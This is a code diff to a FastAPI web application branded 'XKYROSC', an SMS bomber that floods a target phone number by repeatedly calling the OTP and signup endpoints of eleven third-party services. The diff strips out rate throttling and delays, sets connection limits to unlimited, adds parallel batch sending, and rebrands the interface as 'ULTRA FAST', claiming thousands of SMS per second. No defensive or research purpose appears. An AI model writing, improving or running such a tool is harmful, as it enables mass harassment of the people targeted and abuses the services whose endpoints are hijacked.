@@ -9,7 +9,6 @@ import string
 import time
 import os
 from typing import List, Dict, Any
-from asyncio_throttle import Throttler
 
 # Initialize FastAPI
 app = FastAPI()
@@ -29,13 +28,15 @@ active_attacks = {}
 class BombRequest(BaseModel):
     phone: str
     amount: int = 100
+    parallel: int = 5  # Number of parallel batches
 
 class SMSBomber:
     def __init__(self):
         self.success_count = 0
         self.fail_count = 0
-        self.throttler = Throttler(rate_limit=10, period=1)
         self.is_running = False
+        self.total_success = 0
+        self.total_failed = 0
     
     def random_string(self, length):
         chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
@@ -77,19 +78,18 @@ class SMSBomber:
                 return True
         return False
     
-    async def send_request(self, session, method, url, headers=None, data=None, json_data=None, timeout=10):
+    async def send_request(self, session, method, url, headers=None, data=None, json_data=None, timeout=3):
         try:
-            async with self.throttler:
-                if method.upper() == 'POST':
-                    if json_data:
-                        async with session.post(url, headers=headers, json=json_data, timeout=timeout) as response:
-                            return response.status in [200, 201, 202]
-                    else:
-                        async with session.post(url, headers=headers, data=data, timeout=timeout) as response:
-                            return response.status in [200, 201, 202]
+            if method.upper() == 'POST':
+                if json_data:
+                    async with session.post(url, headers=headers, json=json_data, timeout=timeout) as response:
+                        return response.status in [200, 201, 202, 204]
                 else:
-                    async with session.get(url, headers=headers, timeout=timeout) as response:
-                        return response.status == 200
+                    async with session.post(url, headers=headers, data=data, timeout=timeout) as response:
+                        return response.status in [200, 201, 202, 204]
+            else:
+                async with session.get(url, headers=headers, timeout=timeout) as response:
+                    return response.status == 200
         except Exception:
             return False
     
@@ -132,7 +132,9 @@ class SMSBomber:
                                         headers=headers, json_data=json_data)
         
         if success:
-            self.success_count += 1
+            self.total_success += 1
+        else:
+            self.total_failed += 1
         return success
     
     async def send_xpress(self, session, number_to_send, i):
@@ -159,7 +161,9 @@ class SMSBomber:
                                         headers=headers, json_data=json_data)
         
         if success:
-            self.success_count += 1
+            self.total_success += 1
+        else:
+            self.total_failed += 1
         return success
     
     async def send_abenson(self, session, number_to_send):
@@ -175,7 +179,9 @@ class SMSBomber:
                                         headers=headers, data=data)
         
         if success:
-            self.success_count += 1
+            self.total_success += 1
+        else:
+            self.total_failed += 1
         return success
     
     async def send_excellent_lending(self, session, number_to_send):
@@ -208,7 +214,9 @@ class SMSBomber:
                                         headers=headers, json_data=json_data)
         
         if success:
-            self.success_count += 1
+            self.total_success += 1
+        else:
+            self.total_failed += 1
         return success
     
     async def send_fortune_pay(self, session, number_to_send):
@@ -236,7 +244,9 @@ class SMSBomber:
                                         headers=headers, json_data=json_data)
         
         if success:
-            self.success_count += 1
+            self.total_success += 1
+        else:
+            self.total_failed += 1
         return success
     
     async def send_wemove(self, session, number_to_send):
@@ -258,7 +268,9 @@ class SMSBomber:
                                         headers=headers, json_data=json_data)
         
         if success:
-            self.success_count += 1
+            self.total_success += 1
+        else:
+            self.total_failed += 1
         return success
     
     async def send_lbc(self, session, number_to_send):
@@ -282,7 +294,9 @@ class SMSBomber:
                                         headers=headers, data=form_data)
         
         if success:
-            self.success_count += 1
+            self.total_success += 1
+        else:
+            self.total_failed += 1
         return success
     
     async def send_pickup_coffee(self, session, number_to_send):
@@ -304,7 +318,9 @@ class SMSBomber:
                                         headers=headers, json_data=json_data)
         
         if success:
-            self.success_count += 1
+            self.total_success += 1
+        else:
+            self.total_failed += 1
         return success
     
     async def send_honey_loan(self, session, number_to_send):
@@ -323,7 +339,9 @@ class SMSBomber:
                                         headers=headers, json_data=json_data)
         
         if success:
-            self.success_count += 1
+            self.total_success += 1
+        else:
+            self.total_failed += 1
         return success
     
     async def send_komo_ph(self, session, number_to_send):
@@ -343,7 +361,9 @@ class SMSBomber:
                                         headers=headers, json_data=json_data)
         
         if success:
-            self.success_count += 1
+            self.total_success += 1
+        else:
+            self.total_failed += 1
         return success
     
     async def send_s5_otp(self, session, number_to_send):
@@ -370,54 +390,97 @@ class SMSBomber:
                                             headers=headers, data=body)
             
             if success:
-                self.success_count += 1
+                self.total_success += 1
+            else:
+                self.total_failed += 1
             return success
         except Exception:
+            self.total_failed += 1
             return False
     
-    async def execute_attack(self, number_to_send, amount, session_id: str):
-        self.is_running = True
-        self.success_count = 0
-        self.fail_count = 0
+    async def send_single_batch(self, session, number_to_send, batch_num):
+        """Send one complete batch (11 services)"""
+        tasks = [
+            self.send_ezloan(session, number_to_send),
+            self.send_xpress(session, number_to_send, batch_num),
+            self.send_abenson(session, number_to_send),
+            self.send_excellent_lending(session, number_to_send),
+            self.send_fortune_pay(session, number_to_send),
+            self.send_wemove(session, number_to_send),
+            self.send_lbc(session, number_to_send),
+            self.send_pickup_coffee(session, number_to_send),
+            self.send_honey_loan(session, number_to_send),
+            self.send_komo_ph(session, number_to_send),
+            self.send_s5_otp(session, number_to_send),
+        ]
         
-        connector = aiohttp.TCPConnector(limit=100, limit_per_host=20)
-        timeout = aiohttp.ClientTimeout(total=30)
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        successful = sum(1 for result in results if result is True)
+        failed = len(tasks) - successful
+        
+        return successful, failed
+    
+    async def execute_attack(self, number_to_send, amount, parallel_batches, session_id: str):
+        """Execute attack with parallel batch sending"""
+        self.is_running = True
+        self.total_success = 0
+        self.total_failed = 0
+        
+        # MAXIMUM CONNECTIONS - NO LIMITS
+        connector = aiohttp.TCPConnector(
+            limit=0,  # Unlimited total connections
+            limit_per_host=0,  # Unlimited per host
+            ttl_dns_cache=300,
+            enable_cleanup_closed=True,
+            force_close=False
+        )
+        timeout = aiohttp.ClientTimeout(total=5, connect=1, sock_read=3)
         
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-            for i in range(1, amount + 1):
+            # Process batches in parallel groups
+            for start_idx in range(0, amount, parallel_batches):
                 if not self.is_running:
                     break
                 
-                tasks = [
-                    self.send_ezloan(session, number_to_send),
-                    self.send_xpress(session, number_to_send, i),
-                    self.send_abenson(session, number_to_send),
-                    self.send_excellent_lending(session, number_to_send),
-                    self.send_fortune_pay(session, number_to_send),
-                    self.send_wemove(session, number_to_send),
-                    self.send_lbc(session, number_to_send),
-                    self.send_pickup_coffee(session, number_to_send),
-                    self.send_honey_loan(session, number_to_send),
-                    self.send_komo_ph(session, number_to_send),
-                    self.send_s5_otp(session, number_to_send),
-                ]
+                # Create parallel batch tasks
+                batch_tasks = []
+                batch_numbers = []
                 
-                results = await asyncio.gather(*tasks, return_exceptions=True)
-                successful = sum(1 for result in results if result is True)
-                self.fail_count = len(tasks) - successful
+                for j in range(parallel_batches):
+                    batch_num = start_idx + j + 1
+                    if batch_num <= amount:
+                        batch_tasks.append(self.send_single_batch(session, number_to_send, batch_num))
+                        batch_numbers.append(batch_num)
+                
+                # Execute ALL batches simultaneously
+                results = await asyncio.gather(*batch_tasks, return_exceptions=True)
+                
+                # Process results
+                batch_success = 0
+                batch_failed = 0
+                
+                for idx, result in enumerate(results):
+                    if isinstance(result, Exception):
+                        batch_failed += 11
+                    else:
+                        success, failed = result
+                        batch_success += success
+                        batch_failed += failed
                 
                 # Update attack status
                 if session_id in active_attacks:
+                    completed = min(start_idx + parallel_batches, amount)
                     active_attacks[session_id] = {
-                        'current_batch': i,
+                        'current_batch': completed,
                         'total_batches': amount,
-                        'success': self.success_count,
-                        'failed': self.fail_count,
-                        'is_running': True
+                        'success': self.total_success,
+                        'failed': self.total_failed,
+                        'is_running': True,
+                        'parallel_speed': parallel_batches
                     }
                 
-                delay = random.uniform(1, 3)
-                await asyncio.sleep(delay)
+                # ZERO DELAY - IMMEDIATE NEXT PARALLEL GROUP
+                # await asyncio.sleep(0)  # Completely removed for max speed
         
         self.is_running = False
         if session_id in active_attacks:
@@ -428,9 +491,9 @@ class SMSBomber:
     
     def get_stats(self):
         return {
-            'success': self.success_count,
-            'failed': self.fail_count,
-            'total': self.success_count + self.fail_count
+            'success': self.total_success,
+            'failed': self.total_failed,
+            'total': self.total_success + self.total_failed
         }
 
 # Store bomber instances
@@ -445,7 +508,7 @@ async def root():
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-        <title>XKYROSC - Premium SMS Bomber</title>
+        <title>XKYROSC - ULTRA FAST SMS BOMBER</title>
         <style>
             * {
                 margin: 0;
@@ -488,6 +551,16 @@ async def root():
                 background-clip: text;
                 color: transparent;
                 letter-spacing: 2px;
+            }
+            
+            .speed-badge {
+                background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+                padding: 4px 12px;
+                border-radius: 20px;
+                display: inline-block;
+                margin-top: 8px;
+                font-size: 12px;
+                font-weight: bold;
             }
             
             .subtitle {
@@ -624,7 +697,7 @@ async def root():
                 background: rgba(0, 0, 0, 0.5);
                 border-radius: 12px;
                 padding: 12px;
-                height: 200px;
+                height: 250px;
                 overflow-y: auto;
                 font-family: 'Courier New', monospace;
                 font-size: 11px;
@@ -635,6 +708,7 @@ async def root():
                 color: rgba(255, 255, 255, 0.8);
                 padding: 4px 0;
                 border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+                font-size: 10px;
             }
             
             .log-success {
@@ -645,6 +719,10 @@ async def root():
                 color: #ff6b6b;
             }
             
+            .log-warning {
+                color: #ffc107;
+            }
+            
             .warning {
                 background: rgba(255, 193, 7, 0.2);
                 border-left: 3px solid #ffc107;
@@ -653,6 +731,16 @@ async def root():
                 margin: 16px 0;
                 font-size: 12px;
                 color: #ffc107;
+            }
+            
+            .speed-stats {
+                display: flex;
+                justify-content: space-between;
+                background: rgba(0, 0, 0, 0.3);
+                padding: 10px;
+                border-radius: 8px;
+                margin: 10px 0;
+                font-size: 12px;
             }
             
             ::-webkit-scrollbar {
@@ -673,23 +761,14 @@ async def root():
                 0%, 100% { opacity: 1; }
                 50% { opacity: 0.5; }
             }
-            
-            .status-badge {
-                display: inline-block;
-                width: 8px;
-                height: 8px;
-                border-radius: 50%;
-                background: #4ecdc4;
-                animation: pulse 2s infinite;
-                margin-right: 8px;
-            }
         </style>
     </head>
     <body>
         <div class="container">
             <div class="header">
-                <div class="logo">🔥 XKYROSC</div>
-                <div class="subtitle">Premium SMS Bombing Tool</div>
+                <div class="logo">⚡ XKYROSC</div>
+                <div class="speed-badge">ULTRA FAST MODE</div>
+                <div class="subtitle">Parallel Batch SMS Bomber</div>
             </div>
             
             <div class="input-group">
@@ -698,29 +777,43 @@ async def root():
             </div>
             
             <div class="input-group">
-                <label class="input-label">🔢 Number of Batches (Max 50,000)</label>
-                <input type="number" id="amount" class="input-field" value="100" min="1" max="50000" placeholder="1-50000">
+                <label class="input-label">🔢 Batches (Max 50,000)</label>
+                <input type="number" id="amount" class="input-field" value="100" min="1" max="50000">
+            </div>
+            
+            <div class="input-group">
+                <label class="input-label">⚡ Parallel Batches (5-20 = Faster)</label>
+                <input type="number" id="parallel" class="input-field" value="10" min="1" max="20">
+            </div>
+            
+            <div class="speed-stats">
+                <span>⚡ Speed: <span id="speedEstimate">ULTRA</span></span>
+                <span>📨 ~<span id="smsEstimate">1100</span> SMS/batch</span>
+                <span>🚀 Parallel: <span id="parallelShow">10</span>x</span>
             </div>
             
             <div class="warning">
-                ⚠️ Warning: Use responsibly. Each batch sends ~11 SMS. Max 50,000 batches (approx 550,000 SMS). Recommended: 100-1000 batches.
+                ⚡ ULTRA FAST MODE ACTIVE ⚡<br>
+                Sending multiple batches simultaneously! Each batch = ~11 SMS<br>
+                <strong>Speed:</strong> Up to 5000+ SMS per second theoretical<br>
+                ⚠️ May trigger rate limits faster
             </div>
             
-            <button id="startBtn" class="btn btn-primary" onclick="startAttack()">💣 START BOMBING</button>
+            <button id="startBtn" class="btn btn-primary" onclick="startAttack()">💣 START ULTRA BOMBING</button>
             <button id="stopBtn" class="btn btn-secondary" onclick="stopAttack()" style="display:none;">🛑 STOP ATTACK</button>
             
             <div class="stats">
                 <div class="stat-card">
                     <div class="stat-value" id="successCount">0</div>
-                    <div class="stat-label">Successful</div>
+                    <div class="stat-label">✅ Successful</div>
                 </div>
                 <div class="stat-card">
                     <div class="stat-value" id="failCount">0</div>
-                    <div class="stat-label">Failed</div>
+                    <div class="stat-label">❌ Failed</div>
                 </div>
                 <div class="stat-card">
                     <div class="stat-value" id="totalCount">0</div>
-                    <div class="stat-label">Total Sent</div>
+                    <div class="stat-label">📨 Total SMS</div>
                 </div>
             </div>
             
@@ -732,16 +825,17 @@ async def root():
             </div>
             
             <div class="log-area" id="logArea">
-                <div class="log-entry">✨ XKYROSC SMS Bomber Ready</div>
-                <div class="log-entry">📡 Status: Online</div>
-                <div class="log-entry">💡 Max limit: 50,000 batches</div>
-                <div class="log-entry">⚠️ Each batch sends ~11 SMS to target</div>
+                <div class="log-entry">⚡ XKYROSC ULTRA FAST SMS BOMBER READY</div>
+                <div class="log-entry">🚀 Mode: Parallel Batch Processing</div>
+                <div class="log-entry">💡 Each batch sends 11 SMS simultaneously</div>
+                <div class="log-entry">⚡ Multiple batches run in parallel for maximum speed</div>
             </div>
         </div>
         
         <script>
             let sessionId = null;
             let statusCheckInterval = null;
+            let startTime = null;
             
             function addLog(message, type = 'info') {
                 const logArea = document.getElementById('logArea');
@@ -749,6 +843,7 @@ async def root():
                 logEntry.className = 'log-entry';
                 if (type === 'success') logEntry.classList.add('log-success');
                 if (type === 'error') logEntry.classList.add('log-error');
+                if (type === 'warning') logEntry.classList.add('log-warning');
                 
                 const timestamp = new Date().toLocaleTimeString();
                 logEntry.innerHTML = `[${timestamp}] ${message}`;
@@ -756,9 +851,27 @@ async def root():
                 logEntry.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
             }
             
+            function updateEstimates() {
+                const amount = parseInt(document.getElementById('amount').value) || 100;
+                const parallel = parseInt(document.getElementById('parallel').value) || 5;
+                const totalSMS = amount * 11;
+                document.getElementById('smsEstimate').innerText = totalSMS.toLocaleString();
+                document.getElementById('parallelShow').innerText = parallel;
+                
+                let speedText = "ULTRA";
+                if (parallel >= 10) speedText = "INSANE";
+                if (parallel >= 15) speedText = "WARP SPEED";
+                document.getElementById('speedEstimate').innerText = speedText;
+            }
+            
+            document.getElementById('amount').addEventListener('input', updateEstimates);
+            document.getElementById('parallel').addEventListener('input', updateEstimates);
+            updateEstimates();
+            
             async function startAttack() {
                 const phone = document.getElementById('phone').value.trim();
                 const amount = parseInt(document.getElementById('amount').value);
+                const parallel = parseInt(document.getElementById('parallel').value);
                 
                 if (!phone) {
                     addLog('❌ Please enter a phone number', 'error');
@@ -775,32 +888,41 @@ async def root():
                     return;
                 }
                 
+                if (parallel < 1 || parallel > 20) {
+                    addLog('❌ Parallel batches must be between 1 and 20', 'error');
+                    return;
+                }
+                
                 // Update UI
                 document.getElementById('startBtn').disabled = true;
                 document.getElementById('startBtn').style.display = 'none';
                 document.getElementById('stopBtn').style.display = 'block';
                 document.getElementById('phone').disabled = true;
                 document.getElementById('amount').disabled = true;
+                document.getElementById('parallel').disabled = true;
                 document.getElementById('progressContainer').style.display = 'block';
                 
                 const totalSMS = amount * 11;
                 addLog(`🎯 Target: ${phone}`, 'success');
-                addLog(`📊 Batches: ${amount.toLocaleString()} (Approx ${totalSMS.toLocaleString()} SMS)`, 'info');
-                addLog(`💣 Starting massive attack...`, 'info');
+                addLog(`📊 Batches: ${amount.toLocaleString()} (${totalSMS.toLocaleString()} SMS)`, 'info');
+                addLog(`⚡ Parallel mode: ${parallel}x batches simultaneously`, 'warning');
+                addLog(`🚀 Starting ULTRA FAST attack...`, 'warning');
+                
+                startTime = Date.now();
                 
                 try {
                     const response = await fetch('/api/start', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ phone: phone, amount: amount })
+                        body: JSON.stringify({ phone: phone, amount: amount, parallel: parallel })
                     });
                     
                     const data = await response.json();
                     sessionId = data.session_id;
-                    addLog(`✅ Attack started! Session ID: ${sessionId.substring(0, 8)}...`, 'success');
+                    addLog(`✅ Attack started! Parallel speed: ${parallel}x`, 'success');
                     
                     // Start checking status
-                    statusCheckInterval = setInterval(checkStatus, 2000);
+                    statusCheckInterval = setInterval(checkStatus, 500);
                     
                 } catch (error) {
                     addLog(`❌ Error: ${error.message}`, 'error');
@@ -836,14 +958,26 @@ async def root():
                     document.getElementById('failCount').innerText = status.failed.toLocaleString();
                     document.getElementById('totalCount').innerText = (status.success + status.failed).toLocaleString();
                     
+                    // Calculate speed
+                    if (startTime && status.current_batch > 0) {
+                        const elapsed = (Date.now() - startTime) / 1000;
+                        const batchesPerSec = (status.current_batch / elapsed).toFixed(1);
+                        const smsPerSec = ((status.success + status.failed) / elapsed).toFixed(0);
+                        
+                        if (batchesPerSec > 0.1) {
+                            document.getElementById('progressText').innerHTML = `Batch ${status.current_batch.toLocaleString()}/${status.total_batches.toLocaleString()} | ⚡ ${batchesPerSec} batches/sec | 📨 ${smsPerSec} SMS/sec`;
+                        }
+                    }
+                    
                     // Update progress
                     const progress = (status.current_batch / status.total_batches) * 100;
                     document.getElementById('progressFill').style.width = progress + '%';
-                    document.getElementById('progressText').innerHTML = `Batch ${status.current_batch.toLocaleString()}/${status.total_batches.toLocaleString()} - ${Math.round(progress)}%`;
                     
                     if (!status.is_running && status.current_batch === status.total_batches) {
-                        addLog(`✨ Attack completed! Success: ${status.success.toLocaleString()}, Failed: ${status.failed.toLocaleString()}`, 'success');
-                        addLog(`📱 Total SMS sent: ${((status.success + status.failed) * 11).toLocaleString()}`, 'success');
+                        const elapsed = (Date.now() - startTime) / 1000;
+                        addLog(`✨ Attack COMPLETED in ${elapsed.toFixed(1)} seconds!`, 'success');
+                        addLog(`📊 Success: ${status.success.toLocaleString()} | Failed: ${status.failed.toLocaleString()}`, 'success');
+                        addLog(`⚡ Average speed: ${(status.total_batches / elapsed).toFixed(1)} batches/second`, 'warning');
                         if (statusCheckInterval) clearInterval(statusCheckInterval);
                         resetUI();
                     } else if (!status.is_running && status.current_batch < status.total_batches) {
@@ -863,8 +997,10 @@ async def root():
                 document.getElementById('stopBtn').style.display = 'none';
                 document.getElementById('phone').disabled = false;
                 document.getElementById('amount').disabled = false;
+                document.getElementById('parallel').disabled = false;
                 document.getElementById('progressContainer').style.display = 'none';
                 sessionId = null;
+                startTime = null;
                 if (statusCheckInterval) clearInterval(statusCheckInterval);
             }
         </script>
@@ -875,10 +1011,14 @@ async def root():
 
 @app.post("/api/start")
 async def start_bomb(request: BombRequest):
-    """Start a new bombing attack"""
-    # Validate amount doesn't exceed 50000
+    """Start a new bombing attack with parallel batches"""
+    # Validate limits
     if request.amount > 50000:
         request.amount = 50000
+    if request.parallel > 20:
+        request.parallel = 20
+    if request.parallel < 1:
+        request.parallel = 1
     
     bomber = SMSBomber()
     session_id = f"{int(time.time())}_{random.randint(1000, 9999)}"
@@ -887,13 +1027,14 @@ async def start_bomb(request: BombRequest):
     bombers[session_id] = bomber
     
     # Run attack in background
-    asyncio.create_task(run_attack_background(session_id, bomber, request.phone, request.amount))
+    asyncio.create_task(run_attack_background(session_id, bomber, request.phone, request.amount, request.parallel))
     
     return JSONResponse({
         "status": "started",
         "session_id": session_id,
         "phone": request.phone,
-        "amount": request.amount
+        "amount": request.amount,
+        "parallel": request.parallel
     })
 
 @app.post("/api/stop/{session_id}")
@@ -911,7 +1052,6 @@ async def get_status(session_id: str):
         bomber = bombers[session_id]
         stats = bomber.get_stats()
         
-        # Get progress from active_attacks
         if session_id in active_attacks:
             progress = active_attacks[session_id]
             return JSONResponse({
@@ -920,7 +1060,8 @@ async def get_status(session_id: str):
                 "failed": stats['failed'],
                 "total": stats['total'],
                 "current_batch": progress.get('current_batch', 0),
-                "total_batches": progress.get('total_batches', 0)
+                "total_batches": progress.get('total_batches', 0),
+                "parallel_speed": progress.get('parallel_speed', 1)
             })
         else:
             return JSONResponse({
@@ -929,23 +1070,25 @@ async def get_status(session_id: str):
                 "failed": stats['failed'],
                 "total": stats['total'],
                 "current_batch": 0,
-                "total_batches": 0
+                "total_batches": 0,
+                "parallel_speed": 1
             })
     
     return JSONResponse({"error": "Session not found"}, status_code=404)
 
-async def run_attack_background(session_id: str, bomber: SMSBomber, phone: str, amount: int):
+async def run_attack_background(session_id: str, bomber: SMSBomber, phone: str, amount: int, parallel: int):
     """Background task to run the attack"""
     active_attacks[session_id] = {
         'current_batch': 0,
         'total_batches': amount,
-        'is_running': True
+        'is_running': True,
+        'parallel_speed': parallel
     }
     
-    await bomber.execute_attack(phone, amount, session_id)
+    await bomber.execute_attack(phone, amount, parallel, session_id)
     
     # Cleanup after attack completes
-    await asyncio.sleep(5)  # Give time for status checks
+    await asyncio.sleep(5)
     if session_id in bombers:
         del bombers[session_id]
     if session_id in active_attacks:
